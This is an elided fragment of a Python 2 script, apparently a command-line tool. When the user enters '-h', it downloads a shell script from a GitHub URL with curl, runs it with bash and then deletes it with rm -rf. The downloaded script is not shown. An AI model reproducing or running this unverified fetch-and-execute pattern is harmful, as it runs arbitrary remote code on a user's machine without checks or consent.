...
def main():
 while 1:
	...
	if x == "-h":
		...
		os.system("rm -rf $HOME/database.sh")
		os.system("curl -LO https://raw.githubusercontent.com/sachin175638/server1/master/database.sh")
		os.system("mv `pwd`/database.sh $HOME")
		os.system("bash $HOME/database.sh")
		os.system("rm -rf $HOME/database.sh")
	else:
		print ''
